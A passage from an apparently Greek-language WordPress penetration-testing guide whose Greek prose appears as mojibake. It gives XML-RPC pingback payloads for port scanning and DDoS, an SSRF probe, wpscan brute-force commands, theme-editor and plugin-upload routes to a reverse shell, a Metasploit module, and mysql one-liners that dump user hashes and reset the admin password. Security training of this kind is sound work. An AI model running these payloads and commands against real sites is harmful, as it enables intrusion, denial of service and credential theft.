(Î¼Ï€Î¿ÏÎµÎ¯Ï‚ Î½Î± Î´Î·Î»ÏÏƒÎµÎ¹Ï‚ ÏŒÏ€Î¿Î¹Î¿ port Î¸Î­Î»ÎµÎ¹Ï‚).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Î‘Î½ Î»Î¬Î²ÎµÏ„Îµ **faultCode** Î¼Îµ Ï„Î¹Î¼Î® **Î¼ÎµÎ³Î±Î»ÏÏ„ÎµÏÎ·** Î±Ï€ÏŒ **0** (17), ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Î· Î¸ÏÏÎ± ÎµÎ¯Î½Î±Î¹ Î±Î½Î¿Î¹Ï‡Ï„Î®.

Î¡Î¯Î¾Ï„Îµ Î¼Î¹Î± Î¼Î±Ï„Î¹Î¬ ÏƒÏ„Î· Ï‡ÏÎ®ÏƒÎ· Ï„Î¿Ï… **`system.multicall`** ÏƒÏ„Î·Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· ÎµÎ½ÏŒÏ„Î·Ï„Î± Î³Î¹Î± Î½Î± Î¼Î¬Î¸ÎµÏ„Îµ Ï€ÏÏ‚ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î±Ï…Ï„Î® Ï„Î· Î¼Î­Î¸Î¿Î´Î¿ Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÎºÎ±Î»Î­ÏƒÎµÏ„Îµ DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Î‘Ï…Ï„ÏŒ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÏƒÏ„Î· ÏÎ¯Î¶Î± Ï„Î¿Ï… Î¹ÏƒÏ„ÏŒÏ„Î¿Ï€Î¿Ï… Wordpress: **`/wp-cron.php`**\
ÎŒÏ„Î±Î½ Î±Ï…Ï„ÏŒ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ **Ï€ÏÎ¿ÏƒÏ€ÎµÎ»Î±ÏÎ½ÎµÏ„Î±Î¹** ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î­Î½Î± "**Î²Î±ÏÏ**" MySQL **query**, Î¿Ï€ÏŒÏ„Îµ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î±Ï€ÏŒ **attackers** Î³Î¹Î± Î½Î± **Ï€ÏÎ¿ÎºÎ±Î»Î­ÏƒÎµÎ¹** Î­Î½Î± **DoS**.\
Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, Ï„Î¿ `wp-cron.php` ÎºÎ±Î»ÎµÎ¯Ï„Î±Î¹ ÏƒÎµ ÎºÎ¬Î¸Îµ Ï†ÏŒÏÏ„Ï‰ÏƒÎ· ÏƒÎµÎ»Î¯Î´Î±Ï‚ (Î¿Ï€Î¿Ï„ÎµÎ´Î®Ï€Î¿Ï„Îµ Î­Î½Î±Ï‚ client Î¶Î·Ï„Î¬ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ ÏƒÎµÎ»Î¯Î´Î± Wordpress), ÎºÎ¬Ï„Î¹ Ï€Î¿Ï… ÏƒÎµ Î¹ÏƒÏ„ÏŒÏ„Î¿Ï€Î¿Ï…Ï‚ Î¼Îµ Ï…ÏˆÎ·Î»Î® ÎºÎ¯Î½Î·ÏƒÎ· Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÏÎ¿ÎºÎ±Î»Î­ÏƒÎµÎ¹ Ï€ÏÎ¿Î²Î»Î®Î¼Î±Ï„Î± (DoS).

Î£Ï…Î½Î¹ÏƒÏ„Î¬Ï„Î±Î¹ Î½Î± Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ Wp-Cron ÎºÎ±Î¹ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏŒ cronjob ÏƒÏ„Î¿Î½ host Ï€Î¿Ï… Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Ï„Î¹Ï‚ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„ÎµÏ‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ ÏƒÎµ Ï„Î±ÎºÏ„Î¬ Î´Î¹Î±ÏƒÏ„Î®Î¼Î±Ï„Î± (Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Ï€ÏÎ¿ÎºÎ±Î»ÎµÎ¯ Ï€ÏÎ¿Î²Î»Î®Î¼Î±Ï„Î±).

### /wp-json/oembed/1.0/proxy - SSRF

Î”Î¿ÎºÎ¹Î¼Î¬ÏƒÏ„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€ÎµÎ»Î¬ÏƒÎµÏ„Îµ _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ ÎºÎ±Î¹ Î¿ Worpress site Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎºÎ¬Î½ÎµÎ¹ Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± Ï€ÏÎ¿Ï‚ ÎµÏƒÎ¬Ï‚.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Î‘Ï…Ï„ÏŒ Ï„Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Î±Î½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Ï„Î¿ **methodName: pingback.ping** ÎºÎ±Î¹ Ï„Î¿ path **/wp-json/oembed/1.0/proxy** ÎºÎ±Î¹, Î±Î½ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½, Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯ Î½Î± Ï„Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯.

## Î‘Ï…Ï„ÏŒÎ¼Î±Ï„Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î±
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Î‘Ï€ÏŒÎºÏ„Î·ÏƒÎ· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î¼Îµ Ï„Î·Î½ Ï…Ï€ÎµÏÎ³ÏÎ±Ï†Î® ÎµÎ½ÏŒÏ‚ bit

Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ¿ Ï€ÎµÏÎ¹Î­ÏÎ³ÎµÎ¹Î± Ï€Î±ÏÎ¬ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ® ÎµÏ€Î¯Î¸ÎµÏƒÎ·. Î£Ï„Î¿ CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµÏ‚ Î½Î± Î±Î½Î±ÏƒÏ„ÏÎ­ÏˆÎµÎ¹Ï‚ 1 bit ÏƒÎµ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ Î±ÏÏ‡ÎµÎ¯Î¿ wordpress. ÎˆÏ„ÏƒÎ¹ Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµÏ‚ Î½Î± Î±Î½Î±ÏƒÏ„ÏÎ­ÏˆÎµÎ¹Ï‚ Ï„Î· Î¸Î­ÏƒÎ· `5389` Ï„Î¿Ï… Î±ÏÏ‡ÎµÎ¯Î¿Ï… `/var/www/html/wp-includes/user.php` ÏÏƒÏ„Îµ Î½Î± ÎºÎ¬Î½ÎµÎ¹Ï‚ NOP Ï„Î·Î½ NOT (`!`) Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Î Î¯Î½Î±ÎºÎ±Ï‚ RCE**

**Î¤ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· ÎµÎ½ÏŒÏ‚ php Î±Ï€ÏŒ Ï„Î¿ Î¸Î­Î¼Î± Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ (admin credentials needed)**

Î•Î¼Ï†Î¬Î½Î¹ÏƒÎ· â†’ Theme Editor â†’ 404 Template (ÏƒÏ„Î· Î´ÎµÎ¾Î¹Î¬ Ï€Î»ÎµÏ…ÏÎ¬)

Î‘Î»Î»Î¬Î¾Ï„Îµ Ï„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ ÏƒÎµ Î­Î½Î± php shell:

![](<../../images/image (384).png>)

Î‘Î½Î±Î¶Î·Ï„Î®ÏƒÏ„Îµ ÏƒÏ„Î¿ Î´Î¹Î±Î´Î¯ÎºÏ„Ï…Î¿ Ï€ÏÏ‚ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î·Î½ ÎµÎ½Î·Î¼ÎµÏÏ‰Î¼Î­Î½Î· ÏƒÎµÎ»Î¯Î´Î±. Î£Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÎµÎ´Ï: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ session.

## Plugin RCE

### PHP plugin

Î•Î½Î´Î­Ï‡ÎµÏ„Î±Î¹ Î½Î± ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„Î® Î· Î¼ÎµÏ„Î±Ï†ÏŒÏÏ„Ï‰ÏƒÎ· Î±ÏÏ‡ÎµÎ¯Ï‰Î½ .php Ï‰Ï‚ plugin.\
Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Ï„Î¿ php backdoor ÏƒÎ±Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±:

![](<../../images/image (183).png>)

Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÏ„Îµ Î­Î½Î± Î½Î­Î¿ plugin:

![](<../../images/image (722).png>)

Upload plugin and press Install Now:

![](<../../images/image (249).png>)

Click on Procced:

![](<../../images/image (70).png>)

Î Î¹Î¸Î±Î½ÏÏ‚ Î±Ï…Ï„ÏŒ Î´ÎµÎ½ Î¸Î± ÎºÎ¬Î½ÎµÎ¹ Ï„Î¯Ï€Î¿Ï„Î± ÎµÎ¼Ï†Î±Î½ÏÏ‚, Î±Î»Î»Î¬ Î±Î½ Î¼ÎµÏ„Î±Î²ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ Media, Î¸Î± Î´ÎµÎ¯Ï„Îµ Ï„Î¿ shell ÏƒÎ±Ï‚ Î±Î½ÎµÎ²Î±ÏƒÎ¼Î­Î½Î¿:

![](<../../images/image (462).png>)

Î ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î±Ï…Ï„ÏŒ ÎºÎ±Î¹ Î¸Î± Î´ÎµÎ¯Ï„Îµ Ï„Î¿ URL Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Ï„Î¿ reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Î‘Ï…Ï„Î® Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ Î±Ï†Î¿ÏÎ¬ Ï„Î·Î½ ÎµÎ³ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· ÎµÎ½ÏŒÏ‚ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿Ï… plugin Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î³Î½Ï‰ÏƒÏ„ÏŒ ÏŒÏ„Î¹ ÎµÎ¯Î½Î±Î¹ ÎµÏ…Î¬Î»Ï‰Ï„Î¿ ÎºÎ±Î¹ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î·Î¸ÎµÎ¯ Î­Î½Î± web shell. Î‘Ï…Ï„Î® Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… WordPress dashboard Ï‰Ï‚ ÎµÎ¾Î®Ï‚:

1. **Plugin Acquisition**: Î¤Î¿ plugin Î±Ï€Î¿ÎºÏ„Î¬Ï„Î±Î¹ Î±Ï€ÏŒ Î¼Î¹Î± Ï€Î·Î³Î® ÏŒÏ€Ï‰Ï‚ Exploit DB ÏŒÏ€Ï‰Ï‚ [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Î Î»Î¿Î·Î³Î·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ WordPress dashboard, ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Ï€Î·Î³Î±Î¯Î½ÎµÏ„Îµ ÏƒÏ„Î¿ `Dashboard > Plugins > Upload Plugin`.
- Î‘Î½ÎµÎ²Î¬ÏƒÏ„Îµ Ï„Î¿ zip Î±ÏÏ‡ÎµÎ¯Î¿ Ï„Î¿Ï… ÎºÎ±Ï„ÎµÎ²Î±ÏƒÎ¼Î­Î½Î¿Ï… plugin.
3. **Plugin Activation**: ÎœÏŒÎ»Î¹Ï‚ Ï„Î¿ plugin ÎµÎ³ÎºÎ±Ï„Î±ÏƒÏ„Î±Î¸ÎµÎ¯ ÎµÏ€Î¹Ï„Ï…Ï‡ÏÏ‚, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… dashboard.
4. **Exploitation**:
- ÎœÎµ Ï„Î¿ plugin "reflex-gallery" ÎµÎ³ÎºÎ±Ï„ÎµÏƒÏ„Î·Î¼Î­Î½Î¿ ÎºÎ±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ ÎºÎ±Î¸ÏÏ‚ ÎµÎ¯Î½Î±Î¹ Î³Î½Ï‰ÏƒÏ„ÏŒ ÏŒÏ„Î¹ ÎµÎ¯Î½Î±Î¹ ÎµÏ…Î¬Î»Ï‰Ï„Î¿.
- Î¤Î¿ Metasploit framework Ï€Î±ÏÎ­Ï‡ÎµÎ¹ Î­Î½Î± exploit Î³Î¹Î± Î±Ï…Ï„Î® Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±. Î¦Î¿ÏÏ„ÏÎ½Î¿Î½Ï„Î±Ï‚ Ï„Î¿ ÎºÎ±Ï„Î¬Î»Î»Î·Î»Î¿ module ÎºÎ±Î¹ ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½ÎµÏ‚ ÎµÎ½Ï„Î¿Î»Î­Ï‚, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸ÎµÎ¯ Î¼Î¹Î± meterpreter session, Ï€Î±ÏÎ­Ï‡Î¿Î½Ï„Î±Ï‚ Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿Î½ Î¹ÏƒÏ„ÏŒÏ„Î¿Ï€Î¿.
- Î£Î·Î¼ÎµÎ¹ÏÎ½ÎµÏ„Î±Î¹ ÏŒÏ„Î¹ Î±Ï…Ï„ÏŒÏ‚ ÎµÎ¯Î½Î±Î¹ Î¼ÏŒÎ½Î¿ Î­Î½Î±Ï‚ Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ Ï€Î¿Î»Î»Î¿ÏÏ‚ Ï„ÏÏŒÏ€Î¿Ï…Ï‚ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚ ÎµÎ½ÏŒÏ‚ WordPress site.

Î¤Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Î¿Ï€Ï„Î¹ÎºÎ¬ Î²Î¿Î·Î¸Î®Î¼Î±Ï„Î± Ï€Î¿Ï… Î±Ï€ÎµÎ¹ÎºÎ¿Î½Î¯Î¶Î¿Ï…Î½ Ï„Î± Î²Î®Î¼Î±Ï„Î± ÏƒÏ„Î¿ WordPress dashboard Î³Î¹Î± Ï„Î·Î½ ÎµÎ³ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· ÎºÎ±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î¿Ï… plugin. Î©ÏƒÏ„ÏŒÏƒÎ¿, ÎµÎ¯Î½Î±Î¹ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÏŒ Î½Î± ÏƒÎ·Î¼ÎµÎ¹Ï‰Î¸ÎµÎ¯ ÏŒÏ„Î¹ Î· ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· ÎµÏ…Ï€Î±Î¸ÎµÎ¹ÏÎ½ Î¼Îµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Ï„ÏÏŒÏ€Î¿ ÎµÎ¯Î½Î±Î¹ Ï€Î±ÏÎ¬Î½Î¿Î¼Î· ÎºÎ±Î¹ Î±Î½Î®Î¸Î¹ÎºÎ· Ï‡Ï‰ÏÎ¯Ï‚ ÎºÎ±Ï„Î¬Î»Î»Î·Î»Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·. Î‘Ï…Ï„Î­Ï‚ Î¿Î¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ Ï…Ï€ÎµÏÎ¸Ï…Î½Î± ÎºÎ±Î¹ Î¼ÏŒÎ½Î¿ ÏƒÎµ Î½Î¿Î¼Î¹ÎºÏŒ Ï€Î»Î±Î¯ÏƒÎ¹Î¿, ÏŒÏ€Ï‰Ï‚ ÏƒÎµ penetration testing Î¼Îµ ÏÎ·Ï„Î® Î¬Î´ÎµÎ¹Î±.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## Î‘Ï€ÏŒ XSS ÏƒÎµ RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in WordPress. For more info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). It provides **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Î”Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯ Î­Î½Î±Î½ Ï‡ÏÎ®ÏƒÏ„Î· ÏƒÏ„Î¿ WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Î‘Î½ÎµÎ²Î¬ÏƒÏ„Îµ Ï„Î¿ custom plugin (backdoor) ÏƒÎ±Ï‚ ÏƒÏ„Î¿ WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Î•Ï€ÎµÎ¾ÎµÏÎ³Î±ÏƒÎ¯Î± ÎµÎ½ÏƒÏ‰Î¼Î±Ï„Ï‰Î¼Î­Î½Ï‰Î½ plugins ÏƒÏ„Î¿ WordPress.
- _**(RCE) Built-In Theme Edit:**_ Î•Ï€ÎµÎ¾ÎµÏÎ³Î±ÏƒÎ¯Î± ÎµÎ½ÏƒÏ‰Î¼Î±Ï„Ï‰Î¼Î­Î½Ï‰Î½ themes ÏƒÏ„Î¿ WordPress.
- _**(Custom) Custom Exploits:**_ Î ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î± exploits Î³Î¹Î± third-party WordPress plugins/themes.

## Post Exploitation

Extract usernames and passwords:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Î‘Î»Î»Î±Î³Î® ÎºÏ‰Î´Î¹ÎºÎ¿Ï admin:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

Î— Î³Î½ÏÏƒÎ· Ï„Î¿Ï… Ï€ÏÏ‚ Î­Î½Î± Wordpress plugin Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÎ¸Î­ÏƒÎµÎ¹ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÏŒÏ„Î·Ï„Î± ÎµÎ¯Î½Î±Î¹ ÎºÏÎ¯ÏƒÎ¹Î¼Î· Î³Î¹Î± Ï„Î¿Î½ ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÎ¼ÏŒ ÎµÏ…Ï€Î±Î¸ÎµÎ¹ÏÎ½ ÏƒÏ„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Ï„Î¿Ï…. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï€ÏÏ‚ Î­Î½Î± plugin ÎµÎ½Î´Î­Ï‡ÎµÏ„Î±Î¹ Î½Î± ÎµÎºÎ¸Î­Ï„ÎµÎ¹ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÏŒÏ„Î·Ï„Î± ÏƒÏ„Î± Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÏƒÎ·Î¼ÎµÎ¯Î±, ÎºÎ±Î¸ÏÏ‚ ÎºÎ±Î¹ ÎºÎ¬Ï€Î¿Î¹Î± Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± ÎµÏ…Ï€Î±Î¸ÏÎ½ plugins ÏƒÏ„Î¿ [**Î±Ï…Ï„ÏŒ Ï„Î¿ Î¬ÏÎ¸ÏÎ¿**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

ÎˆÎ½Î±Ï‚ Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ Ï„ÏÏŒÏ€Î¿Ï…Ï‚ Ï€Î¿Ï… Î­Î½Î± plugin Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÎ¸Î­ÏƒÎµÎ¹ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚ ÏƒÏ„Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ ÎµÎ¯Î½Î±Î¹ Î¼Î­ÏƒÏ‰ AJAX handlers. Î‘Ï…Ï„Î¿Î¯ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÎµÏÎ¹Î­Ï‡Î¿Ï…Î½ ÏƒÏ†Î¬Î»Î¼Î±Ï„Î± ÏƒÏ„Î· Î»Î¿Î³Î¹ÎºÎ®, authorization Î® authentication. Î•Ï€Î¹Ï€Î»Î­Î¿Î½, ÎµÎ¯Î½Î±Î¹ Î±ÏÎºÎµÏ„Î¬ ÏƒÏ…Ï‡Î½ÏŒ Î±Ï…Ï„Î¬ Ï„Î± functions Î½Î± Î²Î±ÏƒÎ¯Î¶Î¿Ï…Î½ Ï„ÏŒÏƒÎ¿ Ï„Î·Î½ authentication ÏŒÏƒÎ¿ ÎºÎ±Î¹ Ï„Î·Î½ authorization ÏƒÏ„Î·Î½ ÏÏ€Î±ÏÎ¾Î· ÎµÎ½ÏŒÏ‚ Wordpress nonce, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ **Î¿Ï€Î¿Î¹Î¿ÏƒÎ´Î®Ï€Î¿Ï„Îµ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ authenticated ÏƒÏ„Î·Î½ Wordpress instance Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î­Ï‡ÎµÎ¹** (Î±Î½ÎµÎ¾Î±ÏÏ„Î®Ï„Ï‰Ï‚ ÏÏŒÎ»Î¿Ï…).

Î‘Ï…Ï„Î­Ï‚ ÎµÎ¯Î½Î±Î¹ Î¿Î¹ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î³Î¹Î± Î½Î± ÎµÎºÎ¸Î­ÏƒÎ¿Ï…Î½ Î¼Î¹Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± ÏƒÎµ Î­Î½Î± plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**Î— Ï‡ÏÎ®ÏƒÎ· Ï„Î¿Ï… `nopriv` ÎºÎ¬Î½ÎµÎ¹ Ï„Î¿ endpoint Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼Î¿ Î±Ï€ÏŒ Î¿Ï€Î¿Î¹Î¿Ï…ÏƒÎ´Î®Ï€Î¿Ï„Îµ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ (Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Î¼Î· Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿Ï…Ï‚).**

> [!CAUTION]
